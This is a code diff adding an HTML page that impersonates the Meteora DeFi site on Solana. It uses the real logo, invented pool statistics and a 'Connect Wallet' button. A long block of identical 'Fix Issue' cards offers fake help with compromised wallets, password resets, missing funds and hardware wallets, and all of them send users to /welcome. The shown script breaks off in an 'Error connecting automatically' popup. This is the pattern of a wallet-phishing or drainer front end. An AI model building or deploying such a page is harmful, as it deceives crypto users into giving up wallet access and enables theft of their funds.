@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meteora Pools</title>
+    <link rel="icon" type="image/x-icon" href="https://www.meteora.ag/logo.svg"/>
+    <link rel="stylesheet" href="/Home_files/home.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+    <header>
+        <div class="top-bar">
+            <p>New to Meteora? <a href="#">Watch Getting Started</a></p>
+        </div>
+        <div class="bottom-bar">
+            <p>For the first time, memecoin creators can permanently lock liquidity and still compound and claim fees forever!</p>
+        </div>
+        <nav class="navbr">
+            <div class="brand">
+                <img src="https://app.meteora.ag/icons/logo.svg" alt="Meteora Logo" class="logo"> <!-- Logo image -->
+                <p id="brand-name">Meteora</p>
+            </div>
+            <ul>
+                <li><a id="bold-li" href="/welcome">Pools</a></li>
+                <li><a id="bold-li2" href="/welcome">DLMM</a></li>
+                <li><a id="bold-li3" href="/welcome">Portfolio</a></li>
+                <li><a id="bold-li4" href="/welcome">More</a></li>
+            </ul>
+
+            <div class="action-btn">
+                <!-- <div class="priority">
+                    <span style="color: #ffffff;"><p class="priority-text">Priority:</p> <span class="mixed" style="color: #ff9d00;">Mixed</span>
+                    <span class="icon" style="padding-left: 5px;"><i class="fa-solid fa-chevron-down icon"></i>
+                    </span> <span class="icon" style="padding-left: 10px;"><i class="fa-solid fa-gear icon"></i></span></span>
+                </div> -->
+                <div class="connect-wallet">
+                    <button id="connectWalletBtn">Connect Wallet</button>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <section class="pools-summary">
+            <p>Meteora Pools</p>
+
+            <div class="pool-summary-links">
+                <ul>
+                    <li>
+                        <a  class="active" href="/welcome">Dynamic Pools</a>
+                    </li>
+                    <li>
+                        <a class="link2" href="/welcome" >Pool with Farms</a>
+                    </li>
+                    <li>
+                        <a class="link2" href="/welcome">LST Pools</a>
+                    </li>
+                    <li>
+                        <a class="link2" href="/welcome">Multi-token Pools</a>
+                    </li>
+                </ul>
+            </div>
+            
+        </section>
+
+        <section>
+            <div class="pool-stats">
+                <div class="stat">
+                    <h3>Total Value Locked</h3>
+                    <p>$92,211,000.63</p>
+                </div>
+                <div class="stat">
+                    <h3>Swap Volume  
+                        <span class="stat-time1" style="margin-left: 235px; color: #ff693b; font-size: 12px; cursor: pointer; font-weight: 400;">24H</span>
+                         <span class="stat-time2" style="margin-left: 3px; color: #000000; font-size: 12px; cursor: pointer; font-weight: 400;">All</span></h3>
+                    <p>$18,674,602.52</p>
+                </div>
+                <div class="stat">
+                    <h3>Fee</h3>
+                    <p>$162,861.51</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="pool-table">
+            <div class="pool-table-header">
+                <input class="search-input" type="text" placeholder="Search by token name, symbol, etc.">
+                <button id="connectWalletBtn" class="create-pool">+ Create Pool</button>
+            </div>
+            <div class="table-container">
+                <div class="table-header">
+                    <div class="column column-header">Pool</div>
+                    <div class="column column-header header0">Type</div>
+                    <div class="column column-header tvl">TVL/<span class="vol">24H Vol</span></div>
+                    <div class="column column-header header1">24H Vol</div>
+                    <div class="column column-header">365d Yield / TVL</div>
+                    <div class="column column-header header3">LM APR</div>
+                </div>
+        
+                <!-- Example rows -->
+        
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FbSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1%2Flogo.png" alt="Placeholder">
+                        SOL-bSOL
+                        <img src="https://app.meteora.ag/icons/logo.svg" alt="Placeholder" class="column-next-img">
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">LST</span>
+                    </div>
+                    <div class="column column-value">$9.51m</div>
+                    <div class="column column-value">$2,105,717.20</div>
+                    <div class="column"><span class="yield">1.14%</span></div>
+                    <div class="column"><span class="apr">2.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FmSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So%2Flogo.png" alt="Placeholder">
+                        SOL-mSOL
+                        <img src="https://app.meteora.ag/icons/logo.svg" alt="Placeholder" class="column-next-img">
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">LST</span>
+                    </div>
+                    <div class="column column-value">$10.51m</div>
+                    <div class="column column-value">$1,805,717.05</div>
+                    <div class="column"><span class="yield">1.14%</span></div>
+                    <div class="column"><span class="apr">2.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEs9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB%2Flogo.svg" alt="Placeholder">
+                        USDC-USDT
+                        <img src="https://app.meteora.ag/icons/logo.svg" alt="Placeholder" class="column-next-img">
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$11.51m</div>
+                    <div class="column column-value">$2,605,717.75</div>
+                    <div class="column"><span class="yield">1.84%</span></div>
+                    <div class="column"><span class="apr">1.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fstorage.googleapis.com%2Ftoken-metadata%2FJitoSOL-256.png" alt="Placeholder">
+                        SOL-jitoSOL
+                        <img src="https://app.meteora.ag/icons/logo.svg" alt="Placeholder" class="column-next-img">
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">LST</span>
+                    </div>
+                    <div class="column column-value">$7.21m</div>
+                    <div class="column column-value">$1,305,717.11</div>
+                    <div class="column"><span class="yield">1.64%</span></div>
+                    <div class="column"><span class="apr">2.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FLFNTYraetVioAPnGJht4yNg2aUZFXR776cMeN9VMjXp%2Flogo.svg" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v%2Flogo.png" alt="Placeholder">
+                        LFNTY-USDC
+
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$2,565,010.5</div>
+                    <div class="column column-value">$9,215.65</div>
+                    <div class="column"><span class="yield">1.11%</span></div>
+                    <div class="column"><span class="apr">0.86%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fbafkreig55mf3lazzbgndiqyqvdmchdsykvvebww7cqlws6ywgog5xfdzta.ipfs.nftstorage.link" alt="Placeholder">
+                        SOL-vSOL
+                        <img src="https://app.meteora.ag/icons/logo.svg" alt="Placeholder" class="column-next-img">
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$6.51m</div>
+                    <div class="column column-value">$1,305,717.61</div>
+                    <div class="column"><span class="yield">1.22%</span></div>
+                    <div class="column"><span class="apr">0.80%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://gateway.irys.xyz/0qYdLixPAk4cYEpaf3ylqZ-JIbw8Vqg6R9xXZrH9SCc" alt="Placeholder">
+                        SOL-ZERO
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$6.58m</div>
+                    <div class="column column-value">$2,625,700.23</div>
+                    <div class="column"><span class="yield">1.22%</span></div>
+                    <div class="column"><span class="apr">0.80%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://gateway.irys.xyz/e_m_fuGmWQ7JDLFK1NZg2T6zhXwAFu3-HKT89LrbjoI" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        RTR-SOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">Meme Pool</span>
+                    </div>
+                    <div class="column column-value">$10.11m</div>
+                    <div class="column column-value">$1,005,545.33</div>
+                    <div class="column"><span class="yield">1.14%</span></div>
+                    <div class="column"><span class="apr">0.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fbafkreiflz2xxkfn33qjch2wj55bvbn33q3s4mmb6bye5pt3mpgy4t2wg4e.ipfs.nftstorage.link" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fstatic.jup.ag%2FjupSOL%2Ficon.png" alt="Placeholder">
+                        INF-JupSOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$1.51m</div>
+                    <div class="column column-value">$1,125,002.05</div>
+                    <div class="column"><span class="yield">2.72%</span></div>
+                    <div class="column"><span class="apr">1.27%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Felephant.money%2Fimg%2Flogo%2Ftrunk-logo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v%2Flogo.png" alt="Placeholder">
+                        TRUNK-USDC
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$4.25m</div>
+                    <div class="column column-value">$1,001,015.70</div>
+                    <div class="column"><span class="yield">1.92%</span></div>
+                    <div class="column"><span class="apr">1.5%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Farweave.net%2F_0kXu92JN5uU9ELquLgSnp-XukP3D-YDTkXj-QBYS58" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        GM-SOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$13.51m</div>
+                    <div class="column column-value">$2,315,717.61</div>
+                    <div class="column"><span class="yield">1.14%</span></div>
+                    <div class="column"><span class="apr">0.91%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2F6hgaiayuroxlfrn3djpb7mx4ocwielgo2ovpj4ka4v47jsxj2p2a.arweave.net%2F8cwEAxSLrrLFuxpeH7L8cKyCLM7TqvTxQOV59Mrp0_Q%3Fext%3Dpng" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v%2Flogo.png" alt="Placeholder">
+                        META-USDC
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$11.21m</div>
+                    <div class="column column-value">$2,805,717.61</div>
+                    <div class="column"><span class="yield">1.14%</span></div>
+                    <div class="column"><span class="apr">0.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FLFNTYraetVioAPnGJht4yNg2aUZFXR776cMeN9VMjXp%2Flogo.svg" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FxLfNTYy76B8Tiix3hA51Jyvc1kMSFV4sPdR7szTZsRu%2Flogo.svg" alt="Placeholder">
+                        LFNTY-xLFNTY
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$3.01m</div>
+                    <div class="column column-value">$705,717.61</div>
+                    <div class="column"><span class="yield">2.76%</span></div>
+                    <div class="column"><span class="apr">0.70%</span></div>
+                </div>
+        
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fstorage.googleapis.com%2Fstatic-marginfi%2Flst.png" alt="Placeholder">
+                        SOL-LST
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">LST</span>
+                    </div>
+                    <div class="column column-value">$5.51m</div>
+                    <div class="column column-value">$805,715.61</div>
+                    <div class="column"><span class="yield">1.21%</span></div>
+                    <div class="column"><span class="apr">0.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fipfs.filebase.io%2Fipfs%2FQmRT39uwenXSNpWEstYGjTFaF48YWshawLnPEV81bSpmaM" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        RETARDIO-SOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$1.51m</div>
+                    <div class="column column-value">$305,717.61</div>
+                    <div class="column"><span class="yield">1.04%</span></div>
+                    <div class="column"><span class="apr">0.70%</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fgateway.pinit.io%2Fipfs%2FQmUtWudGKFeJAkXceBzgEkZdZsTTZZQvQpua48mhbH72L2%2F0" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        $FAIR-SOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">Meme Pool</span>
+                    </div>
+                    <div class="column column-value">$945.47K</div>
+                    <div class="column column-value">$53,686.33</div>
+                    <div class="column"><span class="yield">21.66%</span></div>
+                    <div class="column"><span class="apr">N/A</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://gateway.irys.xyz/LKy-0Nsr1Nv_BVO5wNZrJNsHolS6p_x1hZeIDBOPD6c" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        WHEN-SOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Volatile</span>
+                        <span class="type-stable">Dynamic</span>
+                        <span class="type-stable">Meme Pool</span>
+                    </div>
+                    <div class="column column-value">$758.75K</div>
+                    <div class="column column-value">$171.66</div>
+                    <div class="column"><span class="yield">0.98%</span></div>
+                    <div class="column"><span class="apr">N/A</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEs9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB%2Flogo.svg" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FEPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v%2Flogo.png" alt="Placeholder">
+                        USDT-USDC
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$698.75K</div>
+                    <div class="column column-value">$58, 254.48</div>
+                    <div class="column"><span class="yield">5.56%</span></div>
+                    <div class="column"><span class="apr">N/A</span></div>
+                </div>
+
+                <div class="table-row">
+                    <div class="column">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fraw.githubusercontent.com%2Fsolana-labs%2Ftoken-list%2Fmain%2Fassets%2Fmainnet%2FSo11111111111111111111111111111111111111112%2Flogo.png" alt="Placeholder">
+                        <img src="https://wsrv.nl/?w=48&h=48&url=https%3A%2F%2Fstatic.jup.ag%2FjupSOL%2Ficon.png" alt="Placeholder">
+                        SOL-JupSOL
+
+                    </div>
+                    <div class="column type-column">
+                        <span class="type-stable">Stable</span>
+                        <span class="type-stable">Dynamic</span>
+                    </div>
+                    <div class="column column-value">$645.5K</div>
+                    <div class="column column-value">$58, 254.48</div>
+                    <div class="column"><span class="yield">0.90%</span></div>
+                    <div class="column"><span class="apr">N/A</span></div>
+                </div>
+                
+
+                <!-- Add more rows as necessary -->
+            </div>
+        </section>
+
+
+    </main>
+
+    <section class="issues-fix">
+        <div class="row">
+            <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Migration</h5>
+                  <p class="card-text">For any issues with Migrate seamlessly with no hassle.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">General Issues</h5>
+                  <p class="card-text">For instant solution on any type of issues, to correct your node strings.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">NFTs/Minting</h5>
+                  <p class="card-text">For any issues with mint/nfts or need support on how to receive any nfts?</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Swap/Exchange</h5>
+                  <p class="card-text">For Swap/Exhange or any other related issues</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Claim Reward</h5>
+                  <p class="card-text">For reward claiming or any related issues.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Claim Reward</h5>
+                  <p class="card-text">For reward claiming or any related issues.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Locked Account</h5>
+                  <p class="card-text">If you are logged out due to activity on the account.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+            
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Deposits & Withdrawals                </h5>
+                  <p class="card-text">For Issues with Withdrawals, claim or related issues.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Reset Wallet Password</h5>
+                  <p class="card-text">To reset any kind of Exchange wallets Password.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Claim Token</h5>
+                  <p class="card-text">TFor airdrop claiming or any related issues.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Transaction Delay                </h5>
+                  <p class="card-text">For stucked/delayed transactions.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Buy Coins/Tokens</h5>
+                  <p class="card-text">To trade, your account must be markrd as a trusted payment source.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Missing Funds/Irregular Balance</h5>
+                  <p class="card-text">Lost access to funds or funds is missing?
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Bridge Transfer</h5>
+                  <p class="card-text">Do you have any issue while trying to transfer tokens between chains?
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Bridge Transfer</h5>
+                  <p class="card-text">Do you have any issue while trying to transfer tokens between chains?
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Unable To Access Wallet</h5>
+                  <p class="card-text">If you are Unable to access your wallet or related issues.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Pool & Farm Access                </h5>
+                  <p class="card-text">Fix issues with any pool and Farm or related issue.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Unable To Access Wallet</h5>
+                  <p class="card-text">If you are Unable to access your wallet or related issues.</p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Token Rectification</h5>
+                  <p class="card-text">For issues with token rectification.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Wallet Compromised</h5>
+                  <p class="card-text">Are you a victim of wallet hack? Freeze all your funds.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Login Issues</h5>
+                  <p class="card-text">If you are encounter any issues logging into your wallet.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Connect to Dapps</h5>
+                  <p class="card-text">To Connect decentralised web applications to moblie wallets.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">
+                    Issues With Trading Wallet</h5>
+                  <p class="card-text">For issues With Trading Wallet
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+
+              <div class="card" style="width: 18rem;">
+                <div class="card-body">
+                  <h5 class="card-title">Ledger & Trezor</h5>
+                  <p class="card-text">For ledger or trezor realted issues.
+                  </p>
+                  <a href="/welcome" class="btn btn-primary">Fix Issue</a>
+                </div>
+              </div>
+        </div>
+    </section>
+
+    <footer></footer>
+
+<script src="dist/bundle.js"></script>
+
+    <script>
+        // Function to manage active link behavior
+        document.addEventListener('DOMContentLoaded', function() {
+            const links = document.querySelectorAll('.pool-summary-links a'); // Select all pool-nav links
+      
+            links.forEach(link => {
+                link.addEventListener('click', function(e) {      
+                    // Remove active class from all links
+                    links.forEach(link => link.classList.remove('active'));
+      
+                    // Add active class to the clicked link
+                    this.classList.add('active');
+                });
+            });
+        });
+      </script>
+
+<script>
+    function showAlert(){
+      Swal.fire({
+        icon: "info",
+        title: 'Connecting',
+        html: `
+                <p style="font-size: 15px; color: red;">Error connecting automatically</p>
+                <div style="display: flex; justify-content: center; align-items: center;">
